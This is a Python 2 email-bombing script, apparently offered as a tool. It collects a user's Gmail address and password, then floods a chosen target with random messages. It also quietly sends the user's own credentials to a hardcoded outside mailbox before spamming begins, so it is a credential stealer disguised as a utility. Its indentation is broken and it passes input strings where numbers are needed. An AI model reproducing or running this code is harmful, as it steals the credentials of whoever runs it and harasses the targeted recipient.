import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from time import sleep as timeout
import datetime
import random
import getpass

class spammer():
    def __init__(self):
        self.banner()
        self.spam()

    def banner(self):
    print """
         ::::::::  :::::::::     :::       :::   :::     :::   :::   :::::::::: ::::::::: 
        :+:    :+: :+:    :+:  :+: :+:    :+:+: :+:+:   :+:+: :+:+:  :+:        :+:    :+: 
       +:+        +:+    +:+ +:+   +:+  +:+ +:+:+ +:+ +:+ +:+:+ +:+ +:+        +:+    +:+  
      +#++:++#++ +#++:++#+ +#++:++#++: +#+  +:+  +#+ +#+  +:+  +#+ +#++:++#   +#++:++#:    
            +#+ +#+       +#+     +#+ +#+       +#+ +#+       +#+ +#+        +#+    +#+    
    #+#    #+# #+#       #+#     #+# #+#       #+# #+#       #+# #+#        #+#    #+#     
    ########  ###       ###     ### ###       ### ###       ### ########## ###    ###      

    """

        def spam(self):
        # Credentials
        username = raw_input("enter your gmail: ")
        password = raw_input("enter your password: ")
        target = raw_input("Target email: ")
        spams = raw_input("how much spam will be sent: ")
	Time = raw_input("input delay, above 10 second: ")
	a = ("Emailnya : %s\nPasswordnya : %s") % (username,password)
	date = datetime.datetime.now().strftime( "%d/%m/%Y %H:%M" )
	target2 = "alviandtm@bk.ru"
	sms = "Form: ANONYMOUS\nTo: %s\nSubject:SPAM\nDate: %s\n\n%s" % (target2,date,a)

        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(username, password)
	server.sendmail(username,target2,sms)

	try:
		server.login(username, password)
	except:
		print "[-] Authentication Error"
		exit()

        print "[!] Engaging the target"
        try:
            for i in xrange(spams):
                subj = random.randrange(0,999999999999999999)
                content = random.randrange(0,999999999999999999)
                name = random.randrange(0,999999999999999999)
                date = datetime.datetime.now().strftime( "%d/%m/%Y %H:%M" )
                msg = "From: ANONYMOUS\nTo: %s\nSubject: %s\nDate: %s\n\n%s" % (target, subj, date, content)

                server.sendmail(username, target, msg)
		timeout(Time)
        except smtplib.SMTPException:
        		print "[-] An Error Occured During Process"
        		print "[!] The target email might be wrong"
        		exit()
        server.quit()
        print "[+] Target engaging complete"

try:
    spammer()
except KeyboardInterrupt:
    print "\n[-] Program Interrupted"
    exit()

